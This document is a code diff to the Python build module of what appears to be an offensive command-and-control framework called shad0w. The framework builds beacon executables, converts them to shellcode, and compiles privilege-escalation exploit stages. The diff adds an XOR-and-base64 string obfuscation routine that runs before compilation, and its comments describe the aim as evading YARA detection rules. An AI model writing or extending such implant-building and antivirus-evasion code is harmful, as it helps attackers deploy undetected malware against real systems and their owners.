@@ -1,4 +1,6 @@
 import os
+import re
+import pefile
 import base64
 import string
 import random
@@ -61,8 +63,52 @@ def update_settings_file(shad0wbuild, custom_template=None, custom_path=None):
     # and just write it
     with open(settings_path, 'w') as file:
         file.write(settings_template)
-    
+
     return
+
+def _crypt_string(raw_string, key):
+    # xor encrypt a string with a provided key
+    crypt_string = ""
+    for letter in raw_string:
+        crypt_string += chr(ord(letter) ^ int(key, 16))
+
+    return base64.b64encode(crypt_string.encode())
+
+def _gen_key(name):
+    key = hex(random.randint(0, 100))
+    return f"#define {name}_KEY {key}", key
+
+def _crypt_strings():
+    # encrypt strings so they are not hanging around in the binary waiting to be
+    # thrown into a yara rule. This is obsfication not encryption
+
+    new_file = ""
+
+    # try:
+    with open("strings.h", "r") as file:
+        data = file.read()
+
+    for define in data.splitlines():
+        old_val = ''.join(re.findall(r'"(.*?)"', define))
+        var_name = ''.join(re.findall(r'#define(.*?)"', define)).strip(" ")
+
+        key_name, key = _gen_key(var_name)
+        new_val = _crypt_string(old_val, key).decode()
+        print(f"{old_val} => {new_val} ({key})")
+
+        new_file += f"#define {var_name} \"{new_val}\"\n"
+        new_file += key_name + "\n"
+
+    with open("strings.h", "w") as file:
+        file.write(new_file)
+
+    # except Exception as e:
+    #     # there was not a strings.h file
+    #     print(e)
+    #     print("it aint here")
+    #     return
+
+
 
 def make_in_clone(arch=None, platform=None, secure=None, static=None, builddir=None, modlocation="/root/shad0w/beacon/beacon.exe", debug=False, make_target=None):
     # build the beacon from the source files, making sure to
@@ -71,7 +117,7 @@ def make_in_clone(arch=None, platform=None, secure=None, static=None, builddir=N
     # builddir should only be none when we are building a beacon
     if builddir is None:
         builddir = "/root/shad0w/beacon/build"
-    
+
     # build the compile time args
     compile_args = ""
 
@@ -85,6 +131,9 @@ def make_in_clone(arch=None, platform=None, secure=None, static=None, builddir=N
 
     # make sure we in the correct build dir
     os.chdir(builddir)
+
+    # do the string encryption
+    _crypt_strings()
 
     # write the compile args to the makefile
     with open("Makefile", "r") as file:
@@ -116,7 +165,7 @@ def make_in_clone(arch=None, platform=None, secure=None, static=None, builddir=N
     except FileNotFoundError:
         print("ERROR: building module")
         return False
-    
+
     return True
 
 def extract_shellcode(beacon_file="/root/shad0w/beacon/beacon.exe", want_base64=False):
@@ -126,7 +175,7 @@ def extract_shellcode(beacon_file="/root/shad0w/beacon/beacon.exe", want_base64=
     # use donut to get it
     if want_base64 is False:
         code = shellcode.generate(beacon_file, None, None, parse=False)
-    
+
     elif want_base64 is True:
         code = base64.b64encode(shellcode.generate(beacon_file, None, None, parse=False)).decode()
 
@@ -144,7 +193,7 @@ def write_and_bridge(filename, rcode):
 
     with open(filename, 'wb') as file:
         file.write(rcode)
-    
+
     return len(rcode)
 
 def raise_issue_payload(string):
@@ -158,7 +207,7 @@ def raise_issue_payload(string):
 def get_payload_variables(payload_string, warn=True):
 
         global secure_warning, static_warning
-        
+
         # set our return args
         arch     = None
         platform = None
@@ -181,7 +230,7 @@ def get_payload_variables(payload_string, warn=True):
             static   = payload[3]
         except IndexError:
             pass
-    
+
         # make sure we get the correct args
         try:
             if static == "static":
@@ -219,7 +268,7 @@ def elevate_auto_build(rootdir=None, template=None, arch=None, check=False, expl
     if template is not None:
         settings_file = build_dir + "/settings.h"
         update_settings_file(None, custom_template=template, custom_path=settings_file)
-    
+
     # compile it
     if arch is None:
         arch = "x86"
@@ -234,7 +283,7 @@ def elevate_auto_build(rootdir=None, template=None, arch=None, check=False, expl
         target = f"exploit_{arch}"
 
     make_in_clone(builddir=build_dir, modlocation=location, arch=arch, make_target=target)
-    
+
     # get the shellcode
     rcode = extract_shellcode(beacon_file=location, want_base64=True)
 
@@ -256,13 +305,13 @@ def shellcode_to_array(data):
             length += 1
             line_len = 0
             continue
-        
+
         if line_len == 0:
             array += f"{hex(i)}, "
             length += 1
             line_len += 1
             continue
-        
+
         # keep the correct sytax at the start
         if length == 0:
             array += f"{hex(i)}, "
@@ -276,17 +325,17 @@ def shellcode_to_array(data):
             length += 1
             line_len += 1
             continue
-    
+
     array += "\n};\n"
     array += f"int stage_len = {len(data)};\n"
 
     return array
-    
+
 
 def elevate_build_stage(shad0w, rootdir=None, os=None, arch=None, secure=None, format=None, static=None):
     # if (rootdir or os or arch or secure) == None:
     #     return
-    
+
     if static == None:
         clone_source_files(asm=True, rootdir="stager")
     elif static == True:
@@ -331,7 +380,7 @@ def _random_string(length):
 
     for _ in range(0, length):
         rstring += random.choice(alphabet)
-    
+
     return rstring
 
 def shrink_exe(name):
